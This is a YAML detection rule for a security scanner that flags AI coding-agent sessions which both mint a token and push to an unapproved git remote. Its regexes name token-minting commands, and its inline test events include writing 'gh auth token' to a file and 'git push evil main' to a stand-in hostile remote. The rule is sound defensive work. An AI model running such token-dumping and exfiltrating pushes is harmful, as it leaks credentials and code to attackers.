# schema: https://scanner.dev/schema/scanner-detection-rule.v1.json
name: Claude - Token Minting with Unapproved Git Push
enabled: Staging
description: |-
  ## Before you enable
  * Works as shipped with `origin` and `upstream` as the approved remotes and a generic token-minting regex. Review both for your environment.
  * Claude Code: set `OTEL_LOG_TOOL_DETAILS=1`, or this rule never fires on Claude Code events (commands and file paths are not logged without it).
  * The inline tests use the shipped defaults. If you change them, update the test events too.

  ## Goal
  Detect a session that both mints a token or credential and pushes to an unapproved git remote, a supply-chain compromise pattern.

  ## Strategy
  In one query over Bash `tool_decision` events, flags token-minting commands and unapproved pushes or remote changes (same logic as `Claude - Git Push to Unapproved Remote`: every push in a command is checked, flags are skipped and a bare `git push` counts as approved), and fires when both occur in the same session within the window.

  ## Triage and response
  1. Identify the token that was minted and revoke it.
  2. Identify the remote and what was pushed.
  3. Treat as a likely supply-chain incident until proven otherwise.

  ## Values you should supply
  * Token-minting command patterns. The regex `gh auth token|access_tokens|sts get-session-token|auth print-access-token|vault token create` is a starting guess (a plain `gh api` call is not counted, since it is too common; `gh api` calls to an `access_tokens` endpoint are); replace it with the commands your agents actually use to obtain tokens.
  * Approved git remote aliases (`origin` and `upstream`, built into the push regex). Do not edit that regex by hand: run `python3 tools/approved_remotes_regex.py --write <remote> [<remote> ...]` from the repository root, which updates this rule and `Claude - Git Push to Unapproved Remote` together. The inline tests use these defaults, so update them too.

  ## Notes and limitations
  * Co-occurrence in the same session and window, not strict ordering.
  * The `cmd = coalesce(regex.extract(...))` step reads `full_command` (falling back to the whole `tool_parameters`) into a guaranteed non-null string; `regex.is_match` rejects possibly-null input.
  * Only covers token minting through Bash; minting through an MCP tool (for example a GitHub MCP server) is not covered.
severity: High
query_text: |-
  log.attributes.event.name:tool_decision
  log.attributes.tool_name:Bash
  | eval cmd = coalesce(regex.extract(log.attributes.tool_parameters, /"full_command":\s*"((?:[^"\\]|\\.)*)"/, 1), coalesce(regex.extract(log.attributes.tool_parameters, /^([\s\S]*)$/, 1), ""))
  | eval is_mint = if(regex.is_match(cmd, /gh auth token|access_tokens|sts get-session-token|auth print-access-token|vault token create/), 1, 0)
  | eval is_bad_push = if(regex.is_match(cmd, /git\s+push(?:\s+-\S+)*\s+(?:\\?"|')?(?:[^\s"'\\;&|ou\-][^\s"'\\;&|]*|o[^\s"'\\;&|r][^\s"'\\;&|]*|o|or[^\s"'\\;&|i][^\s"'\\;&|]*|or|ori[^\s"'\\;&|g][^\s"'\\;&|]*|ori|orig[^\s"'\\;&|i][^\s"'\\;&|]*|orig|origi[^\s"'\\;&|n][^\s"'\\;&|]*|origi|origin[^\s"'\\;&|][^\s"'\\;&|]*|u[^\s"'\\;&|p][^\s"'\\;&|]*|u|up[^\s"'\\;&|s][^\s"'\\;&|]*|up|ups[^\s"'\\;&|t][^\s"'\\;&|]*|ups|upst[^\s"'\\;&|r][^\s"'\\;&|]*|upst|upstr[^\s"'\\;&|e][^\s"'\\;&|]*|upstr|upstre[^\s"'\\;&|a][^\s"'\\;&|]*|upstre|upstrea[^\s"'\\;&|m][^\s"'\\;&|]*|upstrea|upstream[^\s"'\\;&|][^\s"'\\;&|]*)(?:\\?"|')?(?:[\s;&|)]|\\[nrt]|$)/) or regex.is_match(cmd, /git\s+remote\s+(add|set-url)\s/), 1, 0)
  | stats sum(is_mint) as mints, sum(is_bad_push) as bad_pushes by log.attributes.user.id, log.attributes.session.id
  | where mints >= 1 and bad_pushes >= 1
  | rename(log.attributes.user.id as entity_user_id)
time_range_s: 3600
run_frequency_s: 900
dedup_window_s: 3600
alert_per_row: true
event_sink_keys:
- high_severity_alerts
tags:
- source.claude
- product.claude_cowork
- product.claude_code
- correlation.composite_critical
- tactics.ta0010.exfiltration
- techniques.t1195.supply_chain_compromise
tests:
  - name: "gh auth token then push to an unknown remote in one session fires"
    now_timestamp: "2026-09-24T12:00:00.000Z"
    dataset_inline: |
      {"timestamp":"2026-09-24T11:59:00.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"gh\",\"full_command\":\"gh auth token > /tmp/t\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
      {"timestamp":"2026-09-24T11:59:10.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"git\",\"full_command\":\"git push evil main\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
    expected_detection_result: true
  - name: "STS token then a compound push that ends at an unknown remote fires"
    now_timestamp: "2026-09-24T12:00:00.000Z"
    dataset_inline: |
      {"timestamp":"2026-09-24T11:59:00.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"aws\",\"full_command\":\"aws sts get-session-token --duration-seconds 3600\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
      {"timestamp":"2026-09-24T11:59:10.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"git\",\"full_command\":\"git push origin main && git push evil main\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
    expected_detection_result: true
  - name: "Minting a token and pushing to origin with -u does not fire"
    now_timestamp: "2026-09-24T12:00:00.000Z"
    dataset_inline: |
      {"timestamp":"2026-09-24T11:59:00.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"gh\",\"full_command\":\"gh auth token > /tmp/t\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
      {"timestamp":"2026-09-24T11:59:10.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"git\",\"full_command\":\"git push -u origin feat\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
    expected_detection_result: false
  - name: "Mint and unapproved push in different sessions do not fire"
    now_timestamp: "2026-09-24T12:00:00.000Z"
    dataset_inline: |
      {"timestamp":"2026-09-24T11:59:00.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"gh\",\"full_command\":\"gh auth token\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
      {"timestamp":"2026-09-24T11:59:10.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-2","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"git\",\"full_command\":\"git push evil main\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
    expected_detection_result: false
  - name: "A plain gh api call is not treated as minting"
    now_timestamp: "2026-09-24T12:00:00.000Z"
    dataset_inline: |
      {"timestamp":"2026-09-24T11:59:00.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"gh\",\"full_command\":\"gh api repos/acme/web/pulls\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
      {"timestamp":"2026-09-24T11:59:10.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"git\",\"full_command\":\"git push evil main\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
    expected_detection_result: false
  - name: "Token mint then an unapproved push in the middle of chained pushes fires"
    now_timestamp: "2026-09-24T12:00:00.000Z"
    dataset_inline: |
      {"timestamp":"2026-09-24T11:59:00.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"gh\",\"full_command\":\"gh auth token > /tmp/t\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
      {"timestamp":"2026-09-24T11:59:10.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"git\",\"full_command\":\"git push origin main && git push evil main && git push upstream main\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
    expected_detection_result: true
  - name: "Token mint then a push to an unknown remote followed by a newline fires"
    now_timestamp: "2026-09-24T12:00:00.000Z"
    dataset_inline: |
      {"timestamp":"2026-09-24T11:59:00.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"gh\",\"full_command\":\"gh auth token > /tmp/t\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
      {"timestamp":"2026-09-24T11:59:10.000Z","log":{"body":"claude_code.tool_decision","attributes":{"event.name":"tool_decision","user.id":"u-7f3a1c","user.email":"alice@example.com","session.id":"sess-1","terminal.type":"vscode","organization.id":"org-example","tool_name":"Bash","tool_source":"builtin","tool_parameters":"{\"bash_command\":\"git\",\"full_command\":\"git push evil\\ngit log -1\",\"description\":\"Run command\"}","decision":"accept","source":"config"}},"resource":{"attributes":{"service.name":"claude-code"}}}
    expected_detection_result: true
